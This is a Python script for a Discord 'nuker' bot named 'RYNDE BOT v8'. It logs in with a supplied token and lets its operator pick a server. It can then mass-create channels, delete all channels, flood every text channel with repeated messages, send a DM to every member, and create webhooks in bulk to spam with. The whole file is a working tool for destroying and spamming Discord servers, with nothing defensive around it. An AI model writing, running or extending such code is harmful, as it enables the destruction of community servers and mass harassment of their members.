#!/usr/bin/env python3

import discord
from discord.ext import commands
import asyncio
import os
import sys

GREEN = '\033[92m'
DARK_BLUE = '\033[34m'
WHITE = '\033[97m'
RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

clear()

print(f"{DARK_BLUE}{BOLD}=" * 60)
print(f"{DARK_BLUE}{BOLD}            RYNDE BOT")
print(f"{DARK_BLUE}{BOLD}=" * 60)
print("")

TOKEN = input(f"{DARK_BLUE}[?]{WHITE} Token: ").strip()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    clear()
    print(f"""
{DARK_BLUE}{BOLD} ██████╗██╗   ██╗███╗   ██╗██████╗ ███████╗
{DARK_BLUE}{BOLD}██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝
{DARK_BLUE}{BOLD}██║     ██║   ██║██╔██╗ ██║██████╔╝███████╗
{DARK_BLUE}{BOLD}██║     ██║   ██║██║╚██╗██║██╔══██╗╚════██║
{DARK_BLUE}{BOLD}╚██████╗╚██████╔╝██║ ╚████║██████╔╝███████║
{DARK_BLUE}{BOLD} ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝
    """)
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print(f"{GREEN}[+]{WHITE} {bot.user}")
    print(f"{GREEN}[+]{WHITE} {len(bot.guilds)} Servers")
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print("")
    print(f"{DARK_BLUE}{BOLD}╔════════════════════════════════════════════════╗")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}              RYNDE BOT v8                     {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}         {bot.user}              {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}         Server: {bot.guilds[0].name}              {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}         ID: {bot.guilds[0].id}              {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}         Developer: 3zF                      {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}╚════════════════════════════════════════════════╝")
    print("")
    
    print(f"{DARK_BLUE}[?]{WHITE} Select Server:")
    print("")
    for i, guild in enumerate(bot.guilds, 1):
        print(f"  {DARK_BLUE}[{GREEN}{i}{DARK_BLUE}]{WHITE} {guild.name}")
    print("")
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print("")
    
    try:
        choice = int(input(f"{DARK_BLUE}[?]{WHITE} Number: ").strip())
        
        if 1 <= choice <= len(bot.guilds):
            guild = bot.guilds[choice - 1]
            await main_menu(guild)
        else:
            print(f"{RED}[!]{WHITE} Invalid!")
            await bot.close()
            
    except ValueError:
        print(f"{RED}[!]{WHITE} Number!")
        await bot.close()

async def main_menu(guild):
    clear()
    print(f"""
{DARK_BLUE}{BOLD} ██████╗██╗   ██╗███╗   ██╗██████╗ ███████╗
{DARK_BLUE}{BOLD}██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝
{DARK_BLUE}{BOLD}██║     ██║   ██║██╔██╗ ██║██████╔╝███████╗
{DARK_BLUE}{BOLD}██║     ██║   ██║██║╚██╗██║██╔══██╗╚════██║
{DARK_BLUE}{BOLD}╚██████╗╚██████╔╝██║ ╚████║██████╔╝███████║
{DARK_BLUE}{BOLD} ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝
    """)
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print(f"{GREEN}[+]{WHITE} {guild.name}")
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print("")
    print(f"{DARK_BLUE}{BOLD}╔════════════════════════════════════════════════╗")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}              RYNDE BOT v8                     {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}         {bot.user}              {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}         Server: {guild.name}              {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}         ID: {guild.id}              {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}║{WHITE}         Developer: 3zF                      {DARK_BLUE}{BOLD}║")
    print(f"{DARK_BLUE}{BOLD}╚════════════════════════════════════════════════╝")
    print("")
    print(f"  {DARK_BLUE}[{GREEN}1{DARK_BLUE}]{WHITE} Create")
    print(f"  {DARK_BLUE}[{GREEN}2{DARK_BLUE}]{WHITE} Delete")
    print(f"  {DARK_BLUE}[{GREEN}3{DARK_BLUE}]{WHITE} Spam")
    print(f"  {DARK_BLUE}[{GREEN}4{DARK_BLUE}]{WHITE} DM")
    print(f"  {DARK_BLUE}[{GREEN}5{DARK_BLUE}]{WHITE} Webhook")
    print(f"  {DARK_BLUE}[{GREEN}6{DARK_BLUE}]{WHITE} Exit")
    print("")
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print("")
    
    while True:
        try:
            cmd = input(f"{DARK_BLUE}[?]{WHITE} Option: ").strip()
            
            if cmd == "1":
                await create_rooms(guild)
            elif cmd == "2":
                await delete_all(guild)
            elif cmd == "3":
                await spam_all(guild)
            elif cmd == "4":
                await dm_all(guild)
            elif cmd == "5":
                await webhook_spam(guild)
            elif cmd == "6":
                print(f"{RED}[!]{WHITE} Exiting...")
                await bot.close()
                sys.exit()
            else:
                print(f"{RED}[!]{WHITE} Invalid!")
                
        except KeyboardInterrupt:
            print(f"\n{RED}[!]{WHITE} Exiting...")
            await bot.close()
            sys.exit()

async def create_rooms(guild):
    clear()
    print(f"""
{DARK_BLUE}{BOLD} ██████╗██╗   ██╗███╗   ██╗██████╗ ███████╗
{DARK_BLUE}{BOLD}██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝
{DARK_BLUE}{BOLD}██║     ██║   ██║██╔██╗ ██║██████╔╝███████╗
{DARK_BLUE}{BOLD}██║     ██║   ██║██║╚██╗██║██╔══██╗╚════██║
{DARK_BLUE}{BOLD}╚██████╗╚██████╔╝██║ ╚████║██████╔╝███████║
{DARK_BLUE}{BOLD} ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝
    """)
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print(f"{DARK_BLUE}{BOLD}  [1] CREATE")
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print("")
    
    name = input(f"{DARK_BLUE}[?]{WHITE} Name: ").strip()
    count = int(input(f"{DARK_BLUE}[?]{WHITE} Count: ").strip())
    
    print(f"\n{DARK_BLUE}[+]{WHITE} Creating {count} rooms...\n")
    
    chunk = 2000
    created = 0
    
    for i in range(0, count, chunk):
        batch = min(chunk, count - i)
        tasks = []
        for j in range(batch):
            tasks.append(guild.create_text_channel(name))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if not isinstance(r, Exception):
                print(f"{GREEN}[+]{WHITE} Created: {name}")
                created += 1
    
    print(f"\n{GREEN}[+]{WHITE} {created} rooms created!")
    print("")
    input(f"{DARK_BLUE}[?]{WHITE} Enter...")
    await main_menu(guild)

async def delete_all(guild):
    clear()
    print(f"""
{DARK_BLUE}{BOLD} ██████╗██╗   ██╗███╗   ██╗██████╗ ███████╗
{DARK_BLUE}{BOLD}██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝
{DARK_BLUE}{BOLD}██║     ██║   ██║██╔██╗ ██║██████╔╝███████╗
{DARK_BLUE}{BOLD}██║     ██║   ██║██║╚██╗██║██╔══██╗╚════██║
{DARK_BLUE}{BOLD}╚██████╗╚██████╔╝██║ ╚████║██████╔╝███████║
{DARK_BLUE}{BOLD} ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝
    """)
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print(f"{DARK_BLUE}{BOLD}  [2] DELETE")
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print("")
    
    confirm = input(f"{RED}[!]{WHITE} Delete ALL? (y/n): ").strip().lower()
    
    if confirm == "y":
        print(f"\n{DARK_BLUE}[+]{WHITE} Deleting all channels...\n")
        
        chunk = 500
        deleted = 0
        channels = list(guild.channels)
        
        for i in range(0, len(channels), chunk):
            batch = channels[i:i+chunk]
            tasks = [c.delete() for c in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for idx, r in enumerate(results):
                if not isinstance(r, Exception):
                    print(f"{GREEN}[+]{WHITE} Deleted: {batch[idx].name}")
                    deleted += 1
        
        print(f"\n{GREEN}[+]{WHITE} {deleted} channels deleted!")
    else:
        print(f"{RED}[!]{WHITE} Cancelled!")
    
    print("")
    input(f"{DARK_BLUE}[?]{WHITE} Enter...")
    await main_menu(guild)

async def spam_all(guild):
    clear()
    print(f"""
{DARK_BLUE}{BOLD} ██████╗██╗   ██╗███╗   ██╗██████╗ ███████╗
{DARK_BLUE}{BOLD}██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝
{DARK_BLUE}{BOLD}██║     ██║   ██║██╔██╗ ██║██████╔╝███████╗
{DARK_BLUE}{BOLD}██║     ██║   ██║██║╚██╗██║██╔══██╗╚════██║
{DARK_BLUE}{BOLD}╚██████╗╚██████╔╝██║ ╚████║██████╔╝███████║
{DARK_BLUE}{BOLD} ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝
    """)
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print(f"{DARK_BLUE}{BOLD}  [3] SPAM")
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print("")
    
    channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
    
    if not channels:
        print(f"{RED}[!]{WHITE} No channels!")
        print("")
        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
        await main_menu(guild)
        return
    
    print(f"{GREEN}[+]{WHITE} {len(channels)} channels")
    print("")
    
    msg = input(f"{DARK_BLUE}[?]{WHITE} Message: ").strip()
    count = int(input(f"{DARK_BLUE}[?]{WHITE} Times: ").strip())
    
    print(f"\n{DARK_BLUE}[+]{WHITE} Spamming {count} messages to {len(channels)} channels...\n")
    
    total = len(channels) * count
    sent = 0
    tasks = []
    
    for ch in channels:
        for i in range(count):
            tasks.append(ch.send(msg))
    
    chunk = 2000
    
    for i in range(0, len(tasks), chunk):
        batch = tasks[i:i+chunk]
        results = await asyncio.gather(*batch, return_exceptions=True)
        for r in results:
            if not isinstance(r, Exception):
                print(f"{GREEN}[+]{WHITE} Sent: {msg}")
                sent += 1
    
    print(f"\n{GREEN}[+]{WHITE} {sent} messages sent!")
    print("")
    input(f"{DARK_BLUE}[?]{WHITE} Enter...")
    await main_menu(guild)

async def dm_all(guild):
    clear()
    print(f"""
{DARK_BLUE}{BOLD} ██████╗██╗   ██╗███╗   ██╗██████╗ ███████╗
{DARK_BLUE}{BOLD}██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝
{DARK_BLUE}{BOLD}██║     ██║   ██║██╔██╗ ██║██████╔╝███████╗
{DARK_BLUE}{BOLD}██║     ██║   ██║██║╚██╗██║██╔══██╗╚════██║
{DARK_BLUE}{BOLD}╚██████╗╚██████╔╝██║ ╚████║██████╔╝███████║
{DARK_BLUE}{BOLD} ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝
    """)
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print(f"{DARK_BLUE}{BOLD}  [4] DM")
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print("")
    
    members = [m for m in guild.members if not m.bot]
    
    if not members:
        print(f"{RED}[!]{WHITE} No members!")
        print("")
        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
        await main_menu(guild)
        return
    
    print(f"{GREEN}[+]{WHITE} {len(members)} members")
    print("")
    
    msg = input(f"{DARK_BLUE}[?]{WHITE} Message: ").strip()
    
    print(f"\n{DARK_BLUE}[+]{WHITE} Sending DM to {len(members)} members...\n")
    
    sent = 0
    chunk = 200
    
    for i in range(0, len(members), chunk):
        batch = members[i:i+chunk]
        tasks = []
        for m in batch:
            try:
                dm = await m.create_dm()
                tasks.append(dm.send(msg))
            except:
                pass
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if not isinstance(r, Exception):
                    print(f"{GREEN}[+]{WHITE} Sent DM: {msg}")
                    sent += 1
    
    print(f"\n{GREEN}[+]{WHITE} {sent} DMs sent!")
    print("")
    input(f"{DARK_BLUE}[?]{WHITE} Enter...")
    await main_menu(guild)

async def webhook_spam(guild):
    clear()
    print(f"""
{DARK_BLUE}{BOLD} ██████╗██╗   ██╗███╗   ██╗██████╗ ███████╗
{DARK_BLUE}{BOLD}██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝
{DARK_BLUE}{BOLD}██║     ██║   ██║██╔██╗ ██║██████╔╝███████╗
{DARK_BLUE}{BOLD}██║     ██║   ██║██║╚██╗██║██╔══██╗╚════██║
{DARK_BLUE}{BOLD}╚██████╗╚██████╔╝██║ ╚████║██████╔╝███████║
{DARK_BLUE}{BOLD} ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝
    """)
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print(f"{DARK_BLUE}{BOLD}  [5] WEBHOOK")
    print(f"{DARK_BLUE}{BOLD}=" * 60)
    print("")
    
    channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
    
    if not channels:
        print(f"{RED}[!]{WHITE} No channels!")
        print("")
        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
        await main_menu(guild)
        return
    
    print(f"{GREEN}[+]{WHITE} {len(channels)} channels")
    print("")
    
    name = input(f"{DARK_BLUE}[?]{WHITE} Webhook Name: ").strip()
    msg = input(f"{DARK_BLUE}[?]{WHITE} Message: ").strip()
    count = int(input(f"{DARK_BLUE}[?]{WHITE} Per channel: ").strip())
    
    print(f"\n{DARK_BLUE}[+]{WHITE} Creating {count} webhooks in {len(channels)} channels...\n")
    
    all_tasks = []
    all_channels = []
    for ch in channels:
        for i in range(count):
            all_tasks.append(ch.create_webhook(name=name))
            all_channels.append(ch.name)
    
    chunk = 1000
    created = 0
    all_webhooks = []
    
    for i in range(0, len(all_tasks), chunk):
        batch = all_tasks[i:i+chunk]
        channel_batch = all_channels[i:i+chunk]
        results = await asyncio.gather(*batch, return_exceptions=True)
        for idx, r in enumerate(results):
            if not isinstance(r, Exception):
                print(f"{GREEN}[+]{WHITE} Created: {channel_batch[idx]}")
                all_webhooks.append(r)
                created += 1
    
    print(f"\n{DARK_BLUE}[+]{WHITE} Spamming with {len(all_webhooks)} webhooks...\n")
    
    spam_tasks = []
    for idx, wh in enumerate(all_webhooks):
        for i in range(5):
            spam_tasks.append(wh.send(msg))
    
    chunk = 1000
    sent = 0
    
    for i in range(0, len(spam_tasks), chunk):
        batch = spam_tasks[i:i+chunk]
        results = await asyncio.gather(*batch, return_exceptions=True)
        for r in results:
            if not isinstance(r, Exception):
                print(f"{GREEN}[+]{WHITE} Sent: {msg}")
                sent += 1
    
    print(f"\n{GREEN}[+]{WHITE} {created} webhooks created!")
    print(f"{GREEN}[+]{WHITE} {sent} messages sent!")
    print("")
    input(f"{DARK_BLUE}[?]{WHITE} Enter...")
    await main_menu(guild)

try:
    bot.run(TOKEN)
except discord.LoginFailure:
    print(f"{RED}[!]{WHITE} Invalid Token!")
except Exception as e:
    print(f"{RED}[!]{WHITE} Error: {e}")
